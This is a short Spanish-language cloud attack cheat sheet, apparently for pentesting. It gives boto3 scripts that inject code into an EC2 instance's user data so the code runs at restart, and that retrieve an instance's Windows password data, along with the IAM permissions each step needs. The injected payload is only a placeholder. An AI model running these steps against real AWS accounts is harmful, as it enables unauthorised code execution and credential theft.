# Inyección de código en user data

El user data es una funcionalidad de AWS que permite proporcionar scripts o instrucciones que se ejecutan al iniciar la instancia.

#### Permisos necesarios

- ec2:StopInstances
- ec2:ModifyInstanceAttribute
- ec2:StartInstances

        import boto3
        
        # Crear un cliente de EC2
        ec2_client = boto3.client('ec2')
        
        # Definir el ID de la instancia EC2
        instance_id = 'i-1234567890abcdef0'
        
        # Detener la instancia EC2
        ec2_client.stop_instances(InstanceIds=[instance_id])
        
        # Modificar los datos de usuario de la instancia EC2 para ejecutar comandos maliciosos
        user_data_script = '#!/bin/bash\n\nmalicious_command\n'
        ec2_client.modify_instance_attribute(
            InstanceId=instance_id,
            UserData={'Value': user_data_script}
        )
        
        # Iniciar la instancia EC2
        ec2_client.start_instances(InstanceIds=[instance_id])


# Recuperación de contraseñas de un EC2

#### Permisos requeridos

- ec2:GetPasswordData

        import boto3
        
        def retrieve_ec2_password(instance_id):
            # Crear un cliente de EC2
            client = boto3.client('ec2')
            
            # Recuperar los datos de la contraseña para la instancia dada
            response = client.get_password_data(InstanceId=instance_id)
            
            # Devolver los datos de la contraseña
            return response['PasswordData']
